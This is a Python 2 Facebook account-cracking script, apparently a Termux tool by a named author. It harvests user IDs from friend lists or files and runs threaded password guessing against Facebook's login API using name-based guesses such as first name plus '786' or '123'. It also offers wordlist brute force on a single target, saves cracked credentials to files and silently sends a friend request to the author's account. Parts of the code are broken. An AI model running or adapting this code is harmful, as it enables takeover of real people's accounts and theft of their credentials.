#!/usr/bin/python2
#coding=utf-8
 
 
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 
def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()
 
 
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
 
 
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
 
 
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
 
 
#### LOGO ####
logo = """
\033[0;39m╔═╗─╔╦═══╦═══╦═══╦═══╦═╗╔═╗
\033[0;39m║║╚╗║║╔═╗╠╗╔╗║╔══╣╔══╣║╚╝║║
\033[0;39m║╔╗╚╝║║─║║║║║║╚══╣╚══╣╔╗╔╗║
\033[0;39m║║╚╗║║╚═╝║║║║║╔══╣╔══╣║║║║║
\033[0;39m║║─║║║╔═╗╠╝╚╝║╚══╣╚══╣║║║║║
\033[0;39m╚╝─╚═╩╝─╚╩═══╩═══╩═══╩╝╚╝╚╝
\033[0;39m☝☝☝☝☝☝☝☝☝☝☝☝☝☝☝
\033[0;39m
\033[0;39m👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
\033[0;39m██████╗░░█████╗░███╗░░██╗░█████╗░
\033[0;39m██╔══██╗██╔══██╗████╗░██║██╔══██╗
\033[0;39m██████╔╝███████║██╔██╗██║███████║
\033[0;39m██╔══██╗██╔══██║██║╚████║██╔══██║
\033[0;39m██║░░██║██║░░██║██║░╚███║██║░░██║
\033[0;39m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
\033[0;39m█████████████████████████████████████████████████████████
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓
\033[0;39m💓💓💓💓💓💓



\033[0;39m\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|Mr-Nadeem\033[0;31m║
\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/Rananadeem5214\033[0m \033[0;31m║
\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0308-2503426\033[0;31m║
\033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mprocessing Rajput \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 
 
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
 
os.system("clear")
print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
print  """\x1b[0;31m [¤] \x1b[0;31mRana Nadeem Rajput\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 03082503426\x1b[1;96m  
\033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
\033[1;93m [¤] \x1b[0;31mTOOLS BY Rajput\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : Mr Nadeem\x1b[0;31m"""
print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
CorrectUsername = "Rana"
CorrectPassword = "Nadeem"
 
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Waiting"
            os.system('xdg-open  https://www.facebook.com/muhammad.nadeem.5214')
    else:
        print "Waiting !"
        os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
 
def login():
 os.system('clear')
	try:
		toket = open('.fb_token.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print("[1] Token login")
		print("[2] id/pass login")
		print("")
		login_select()
def login_select():
    afza = raw_input(" Rajput Tools  ")
    if afza =="1":
        os.system("clear")
        print logo
        print("")
        print("\t    \033[1;32mFB Token Login\033[0;97m")
        print("")
        token = raw_input(" Bhai Saab Token Lagao : ")
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("")
            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            menu()
        except (KeyError , IOError):
            print("")
            print("\t    \033[1;31mToken not valid\033[0;97m")
            print("")
            raw_input(" Press enter to try again ")
            login()
    if afza =="2":
        login_fb()
    else:
        print("")
        print("\t    "+c+"Select valid method"+c2)
        print("")
        login_select()
def login_fb():
	os.system("clear")
	print logo
	print("")
	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
	print("")
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	print("")
	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
	q = json.loads(data)
	if "loc" in q:
		hamza = open(".fb_token.txt","w")
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
		time.sleep(1)
		print("\t    \033[1;32mLogged in successfully\033[0;97m")
		time.sleep(1)
		menu()
	elif "www.facebook.com" in q["error"]:
		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
		print("")
		time.sleep(1)
		raw_input(" Press enter to try again ")
		login_fb()
	else:
		print("\t\033[1;31mID/Number/Password may be wrong\033[0;97m")
		print("")
		raw_input(" Press enter to try again ")
		login_fb()


def menu():
	os.system('clear')
	try:
		toket=open('.fb_token.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf .fb_token.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf .fb_token.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
	print "\033[1;32;40m[2] \033[1;33;40m══Update M.T"																														
	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
	pilih()
 
def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄Mr Nadeem►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
 
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
	pilih_super()
 
def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
 
		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
 
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;40m[✺] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;92m[✺] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()
 
	
	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
	jalan('\033[1;34;40m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
	print "   \033[1;31;48m●════════════════════════◄Rana►════════════════════════💋●"
 
	jalan('                    \033[1;91mMR NADEEM start cloning Wait...')
	print  "  \033[1;36;48m ●════════════════════════◄Nadeem►════════════════════════💋●" 
 
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[Rana_Hacked] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[Rana_CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' 👽 ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[Rana_Hacked] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' 👽 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[Rana_CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[Rana_Hacked] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' 👽 ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[Rana_CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[Rana_Hacked] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' 👽 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[Rana_CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[Rana_Hacked] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' 👽 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[Rana_CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[Rana_Hacked] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' 👽 ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[Rana_CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' 👽 ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[Rana_Hacked] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' 👽 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[Rana_CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'
	print "\033[1;32;40m[+] Total Rana_Hacked/\x1b[1;93mRana_CP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[1;31;40m ●════════════════════════◄►════════════════════════●
           """
	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
	super()
 
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)
 
        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""
            super()
 
if __name__ == '__main__':
	login()
 
